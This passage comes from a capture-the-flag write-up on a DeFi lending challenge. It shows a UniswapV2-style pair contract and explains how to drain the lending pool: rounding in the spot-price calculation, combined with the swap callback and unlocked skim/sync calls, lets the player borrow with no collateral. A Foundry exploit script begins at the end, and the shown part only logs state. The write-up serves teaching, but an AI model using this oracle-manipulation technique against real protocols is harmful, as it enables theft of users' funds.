</span><span>        (</span><span style=color:#0086b3>uint112</span><span> _reserve0, </span><span style=color:#0086b3>uint112</span><span> _reserve1,) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(); </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        </span><span style=color:#0086b3>uint</span><span> amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance0.</span><span style=color:#62a35c>sub</span><span>(_reserve0);
</span><span>        </span><span style=color:#0086b3>uint</span><span> amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance1.</span><span style=color:#62a35c>sub</span><span>(_reserve1);
</span><span>
</span><span>        </span><span style=color:#0086b3>bool</span><span> feeOn </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_mintFee</span><span>(_reserve0, _reserve1);
</span><span>        </span><span style=color:#0086b3>uint</span><span> _totalSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> totalSupply; </span><span style=color:#969896;font-style:italic>// gas savings, must be defined here since totalSupply can update in _mintFee
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(_totalSupply </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            liquidity </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>sqrt</span><span>(amount0.</span><span style=color:#62a35c>mul</span><span>(amount1)).</span><span style=color:#62a35c>sub</span><span>(MINIMUM_LIQUIDITY);
</span><span>           </span><span style=color:#62a35c>_mint</span><span>(</span><span style=color:#0086b3>address</span><span>(0), MINIMUM_LIQUIDITY); </span><span style=color:#969896;font-style:italic>// permanently lock the first MINIMUM_LIQUIDITY tokens
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            liquidity </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>min</span><span>(amount0.</span><span style=color:#62a35c>mul</span><span>(_totalSupply) </span><span style=color:#a71d5d;font-weight:700>/</span><span> _reserve0, amount1.</span><span style=color:#62a35c>mul</span><span>(_totalSupply) </span><span style=color:#a71d5d;font-weight:700>/</span><span> _reserve1);
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(liquidity </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED'</span><span>);
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(to, liquidity);
</span><span>
</span><span>        </span><span style=color:#62a35c>_update</span><span>(balance0, balance1, _reserve0, _reserve1);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(feeOn) kLast </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint</span><span>(reserve0).</span><span style=color:#62a35c>mul</span><span>(reserve1); </span><span style=color:#969896;font-style:italic>// reserve0 and reserve1 are up-to-date
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount0, amount1);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// this low-level function should be called from a contract which performs important safety checks
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>burn</span><span>(</span><span style=color:#0086b3>address </span><span>to) </span><span style=color:#a71d5d;font-weight:700>external lock returns </span><span>(</span><span style=color:#0086b3>uint</span><span> amount0, </span><span style=color:#0086b3>uint</span><span> amount1) {
</span><span>        (</span><span style=color:#0086b3>uint112</span><span> _reserve0, </span><span style=color:#0086b3>uint112</span><span> _reserve1,) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(); </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#0086b3>address</span><span> _token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token0;                                </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#0086b3>address</span><span> _token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token1;                                </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        </span><span style=color:#0086b3>uint</span><span> liquidity </span><span style=color:#a71d5d;font-weight:700>=</span><span> balanceOf[address(this)];
</span><span>
</span><span>        </span><span style=color:#0086b3>bool</span><span> feeOn </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_mintFee</span><span>(_reserve0, _reserve1);
</span><span>        </span><span style=color:#0086b3>uint</span><span> _totalSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> totalSupply; </span><span style=color:#969896;font-style:italic>// gas savings, must be defined here since totalSupply can update in _mintFee
</span><span>        amount0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> liquidity.</span><span style=color:#62a35c>mul</span><span>(balance0) </span><span style=color:#a71d5d;font-weight:700>/</span><span> _totalSupply; </span><span style=color:#969896;font-style:italic>// using balances ensures pro-rata distribution
</span><span>        amount1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> liquidity.</span><span style=color:#62a35c>mul</span><span>(balance1) </span><span style=color:#a71d5d;font-weight:700>/</span><span> _totalSupply; </span><span style=color:#969896;font-style:italic>// using balances ensures pro-rata distribution
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 </span><span style=color:#a71d5d;font-weight:700>&&</span><span> amount1 </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED'</span><span>);
</span><span>        </span><span style=color:#62a35c>_burn</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), liquidity);
</span><span>        </span><span style=color:#62a35c>_safeTransfer</span><span>(_token0, to, amount0);
</span><span>        </span><span style=color:#62a35c>_safeTransfer</span><span>(_token1, to, amount1);
</span><span>        balance0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        balance1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>
</span><span>        </span><span style=color:#62a35c>_update</span><span>(balance0, balance1, _reserve0, _reserve1);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(feeOn) kLast </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>uint</span><span>(reserve0).</span><span style=color:#62a35c>mul</span><span>(reserve1); </span><span style=color:#969896;font-style:italic>// reserve0 and reserve1 are up-to-date
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount0, amount1, to);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// this low-level function should be called from a contract which performs important safety checks
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swap</span><span>(</span><span style=color:#0086b3>uint </span><span>amount0Out, </span><span style=color:#0086b3>uint </span><span>amount1Out, </span><span style=color:#0086b3>address </span><span>to, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data) </span><span style=color:#a71d5d;font-weight:700>external lock </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0Out </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 </span><span style=color:#a71d5d;font-weight:700>||</span><span> amount1Out </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT'</span><span>);
</span><span>        (</span><span style=color:#0086b3>uint112</span><span> _reserve0, </span><span style=color:#0086b3>uint112</span><span> _reserve1,) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(); </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0Out </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> _reserve0 </span><span style=color:#a71d5d;font-weight:700>&&</span><span> amount1Out </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> _reserve1, </span><span style=color:#183691>'UniswapV2: INSUFFICIENT_LIQUIDITY'</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance1;
</span><span>        { </span><span style=color:#969896;font-style:italic>// scope for _token{0,1}, avoids stack too deep errors
</span><span>        </span><span style=color:#0086b3>address</span><span> _token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token0;
</span><span>        </span><span style=color:#0086b3>address</span><span> _token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token1;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(to </span><span style=color:#a71d5d;font-weight:700>!=</span><span> _token0 </span><span style=color:#a71d5d;font-weight:700>&&</span><span> to </span><span style=color:#a71d5d;font-weight:700>!=</span><span> _token1, </span><span style=color:#183691>'UniswapV2: INVALID_TO'</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0Out </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) </span><span style=color:#62a35c>_safeTransfer</span><span>(_token0, to, amount0Out); </span><span style=color:#969896;font-style:italic>// optimistically transfer tokens
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1Out </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) </span><span style=color:#62a35c>_safeTransfer</span><span>(_token1, to, amount1Out); </span><span style=color:#969896;font-style:italic>// optimistically transfer tokens
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(data.</span><span style=color:#a71d5d;font-weight:700>length ></span><span> 0) </span><span style=color:#62a35c>IUniswapV2Callee</span><span>(to).</span><span style=color:#62a35c>uniswapV2Call</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount0Out, amount1Out, data);
</span><span>        balance0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        balance1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        }
</span><span>        </span><span style=color:#0086b3>uint</span><span> amount0In </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance0 </span><span style=color:#a71d5d;font-weight:700>></span><span> _reserve0 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount0Out </span><span style=color:#a71d5d;font-weight:700>?</span><span> balance0 </span><span style=color:#a71d5d;font-weight:700>- </span><span>(_reserve0 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount0Out) </span><span style=color:#a71d5d;font-weight:700>:</span><span> 0;
</span><span>        </span><span style=color:#0086b3>uint</span><span> amount1In </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>></span><span> _reserve1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount1Out </span><span style=color:#a71d5d;font-weight:700>?</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>- </span><span>(_reserve1 </span><span style=color:#a71d5d;font-weight:700>-</span><span> amount1Out) </span><span style=color:#a71d5d;font-weight:700>:</span><span> 0;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(amount0In </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 </span><span style=color:#a71d5d;font-weight:700>||</span><span> amount1In </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>'UniswapV2: INSUFFICIENT_INPUT_AMOUNT'</span><span>);
</span><span>        { </span><span style=color:#969896;font-style:italic>// scope for reserve{0,1}Adjusted, avoids stack too deep errors
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance0Adjusted </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance0.</span><span style=color:#62a35c>mul</span><span>(</span><span style=color:#0086b3>1000</span><span>).</span><span style=color:#62a35c>sub</span><span>(amount0In.</span><span style=color:#62a35c>mul</span><span>(3));
</span><span>        </span><span style=color:#0086b3>uint</span><span> balance1Adjusted </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance1.</span><span style=color:#62a35c>mul</span><span>(</span><span style=color:#0086b3>1000</span><span>).</span><span style=color:#62a35c>sub</span><span>(amount1In.</span><span style=color:#62a35c>mul</span><span>(3));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(balance0Adjusted.</span><span style=color:#62a35c>mul</span><span>(balance1Adjusted) </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>uint</span><span>(_reserve0).</span><span style=color:#62a35c>mul</span><span>(_reserve1).</span><span style=color:#62a35c>mul</span><span>(</span><span style=color:#0086b3>1000</span><span style=color:#a71d5d;font-weight:700>**</span><span>2), </span><span style=color:#183691>'UniswapV2: K'</span><span>);
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#62a35c>_update</span><span>(balance0, balance1, _reserve0, _reserve1);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>Swap</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount0In, amount1In, amount0Out, amount1Out, to);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// force balances to match reserves
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>skim</span><span>(</span><span style=color:#0086b3>address </span><span>to) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#0086b3>address</span><span> _token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token0; </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#0086b3>address</span><span> _token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token1; </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#62a35c>_safeTransfer</span><span>(_token0, to, </span><span style=color:#0086b3>IERC20</span><span>(_token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)).</span><span style=color:#62a35c>sub</span><span>(reserve0));
</span><span>        </span><span style=color:#62a35c>_safeTransfer</span><span>(_token1, to, </span><span style=color:#0086b3>IERC20</span><span>(_token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)).</span><span style=color:#62a35c>sub</span><span>(reserve1));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// force reserves to match balances
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sync</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#62a35c>_update</span><span>(</span><span style=color:#0086b3>IERC20</span><span>(token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)), </span><span style=color:#0086b3>IERC20</span><span>(token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)), reserve0, reserve1);
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-2>Solution</h2><p>A Defi protocol requires nothing else than except complete understanding about the protocol control flow. Lets observe what each contract in this protocol is doing.<ol><li><p><strong>Lending Contract</strong>:</p> <ul><li>Add collateral using <code>collateralToken</code><li>Borrow <code>borrowToken</code> against their collateral<li>Repay borrowed tokens<li><strong>Uses a Pair contract to determine exchange rates</strong></ul><li><p><strong>Pair Contract</strong> (UniswapV2-style):</p> <ul><li>Implements an automated market maker (AMM)<li>Manages liquidity between two tokens (token0 and token1)<li>Handles token swaps and price calculations<li>Maintains reserves and updates prices<li>Provides functions for adding/removing liquidity<li><strong>Used by the Lending contract to get exchange rates</strong></ul><li><p><strong>SafeMath Library</strong>:</p> <ul><li>Provides safe arithmetic operations<li>Prevents overflows/underflows in mathematical calculations<li>Used by the Pair contract for calculations</ul><li><p><strong>UQ112x112 Library</strong>:</p> <ul><li>Handles fixed-point number calculations<li>Used for price calculations in the Pair contract<li>Helps maintain precision in price calculations</ul><li><p><strong>IUniswapV2Callee Interface</strong>:</p> <ul><li>Defines the callback interface for flash swaps<li>Used when executing flash swaps in the Pair contract</ul></ol><p>The goal is to drain all <code>borrowToken</code> from the Lending contract. I always prefer to know the initial state of the protocol by querying all the information from the contracts deployed. The following is the state of the protocol when we initially received the challenge instance.<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>Lending :  0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6
</span><span>Pair :  0xE86b07a57552655eEFe68894bD346c84da238B15
</span><span>token0 (or) collateralToken  :  0xCcb0B898D555656e582b8d17ba7b426330Abb9D8
</span><span>token1 (or) borrowToken:   0x7373EB31cBDd5428720a37d50E5ec64EfA891acc
</span><span>Pair balance of collatoralToken :  500000000000000000000
</span><span>Pair balance of borrowToken :  500000000000000000000
</span><span>Pair reserve0 :  500000000000000000000
</span><span>Pair reserve1 :  500000000000000000000
</span><span>Lending balance of collatoralToken :  0
</span><span>Lending balance of borrowToken :  5000000000000000000000
</span><span>Player balance of collatoralToken :  0
</span><span>Player balance of borrowToken :  0
</span><span>price of borrowToken in terms of collatoralTokens :  1000000000000000000
</span><span>Player :  0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6
</span></code></pre><p>As you can observe I got zero amount of both collatoral and borrow tokens, but Lending contract have the <code>5000e18</code> of borrow tokens and the Pair contract got the <code>500e18</code> amount of both the tokens.<p>Now for me, I don't have any <code>collatoralToken</code> to borrow the token from the Lending contract and drain them all. So, lets see how the <code>borrow()</code> function calcuates how much collatoral needed to borrow all those <code>5000e18</code> amount of borrow tokens.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>borrow</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256</span><span> needCollateral </span><span style=color:#a71d5d;font-weight:700>=</span><span> _amount </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getExchangeRate</span><span>() </span><span style=color:#a71d5d;font-weight:700>/</span><span> 1e18;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(needCollateral </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> usersCollateral[msg.sender], </span><span style=color:#183691>"You don't have enough collateral"</span><span>);
</span><span>    borrowToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _amount);
</span><span>    usersUsedCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> needCollateral;
</span><span>    usersCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> needCollateral;
</span><span>    usersBorrowed[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _amount;
</span><span>}
</span></code></pre><blockquote><p>The <code>needCollateral</code> is calculated from the <code>getExchangeRate()</code> and divided by the <code>1e18</code>. Can we make this numerator as lesser than <code>1e18</code> ? So that the division will rounded to zero and we don't need to pay any <code>collatoralToken</code>.</blockquote><p>Smart right?<p>Lets see how can we do this? We need to make <code>getExchangeRate()</code> return a very small number or even zero would be perfect!<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>    </span><span style=color:#969896;font-style:italic>// Lending
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getExchangeRate</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> pair.</span><span style=color:#62a35c>getSpotPrice</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>//Pair
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getSpotPrice</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> Math.</span><span style=color:#62a35c>mulDiv</span><span>(reserve1, 1e18, reserve0);
</span><span>    }
</span></code></pre><p>Now we can see that the price of the <code>collatoralToken</code> is dependent on the <code>reserve0</code> and <code>reserve1</code>. And we need to manipulate the <code>reserve0</code> to be a large number than <code>reserve1 * 1e18</code> so that the <code>getSpotPrice()</code> will return zero.<p>To do this, I found out that we can perform few swaps in the Pair contract which changes the values of <code>reserve0</code> and <code>reserve1</code>. But if we do the borrow from Lending after the <code>swap()</code> the again the price will be increase. So, we need to find a way to update the reserves during the swap and borrow the amount in the same transacation. If we can observe there is a callback happening to the caller in the <code>swap()</code> function.<blockquote><p>if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</blockquote><p>So, during this callback we can borrow from Lending contract but the reserves need a forceful update. To do this we can make use of the vulnerable <code>skim()</code> and <code>sync()</code> functions in the Pair contract.<blockquote><p>Why <code>skim()</code> and <code>sync()</code> are vulnerable? Cause there is no reentrancy lock on these.</blockquote><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>    </span><span style=color:#969896;font-style:italic>// force balances to match reserves
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>skim</span><span>(</span><span style=color:#0086b3>address </span><span>to) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#0086b3>address</span><span> _token0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token0; </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#0086b3>address</span><span> _token1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> token1; </span><span style=color:#969896;font-style:italic>// gas savings
</span><span>        </span><span style=color:#62a35c>_safeTransfer</span><span>(_token0, to, </span><span style=color:#0086b3>IERC20</span><span>(_token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)).</span><span style=color:#62a35c>sub</span><span>(reserve0));
</span><span>        </span><span style=color:#62a35c>_safeTransfer</span><span>(_token1, to, </span><span style=color:#0086b3>IERC20</span><span>(_token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)).</span><span style=color:#62a35c>sub</span><span>(reserve1));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// force reserves to match balances
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sync</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#62a35c>_update</span><span>(</span><span style=color:#0086b3>IERC20</span><span>(token0).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)), </span><span style=color:#0086b3>IERC20</span><span>(token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)), reserve0, reserve1);
</span><span>    }
</span></code></pre><p>Thats how I manipulated the <code>borrowToken</code> price to borrowed all the tokens from Lending. Find the exploit below.<div class=note-container><button class=note-toggle><div class=note-icon><p>Lending.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Pair, Lending, </span><span style=color:#0086b3>ERC20</span><span>} from "../src/Lending.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>LendingSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Lending </span><span style=color:#a71d5d;font-weight:700>public </span><span>lending </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Lending</span><span>(</span><span style=color:#0086b3>0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6</span><span>);
</span><span>    Pair </span><span style=color:#a71d5d;font-weight:700>public </span><span>pair </span><span style=color:#a71d5d;font-weight:700>=</span><span> lending.</span><span style=color:#62a35c>pair</span><span>();
</span><span>    </span><span style=color:#0086b3>ERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> collateralToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> lending.</span><span style=color:#62a35c>collateralToken</span><span>();
</span><span>    </span><span style=color:#0086b3>ERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> borrowToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> lending.</span><span style=color:#62a35c>borrowToken</span><span>();
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Lending : "</span><span>, </span><span style=color:#0086b3>address</span><span>(lending));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair : "</span><span>, </span><span style=color:#0086b3>address</span><span>(pair));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"token0 (or) collateralToken  : "</span><span>, pair.</span><span style=color:#62a35c>token0</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"token1 (or) borrowToken:  "</span><span>, pair.</span><span style=color:#62a35c>token1</span><span>());
</span><span>        
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair balance of collatoralToken : "</span><span>, collateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pair)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pair balance of borrowToken : "</span><span>, borrowToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pair)));
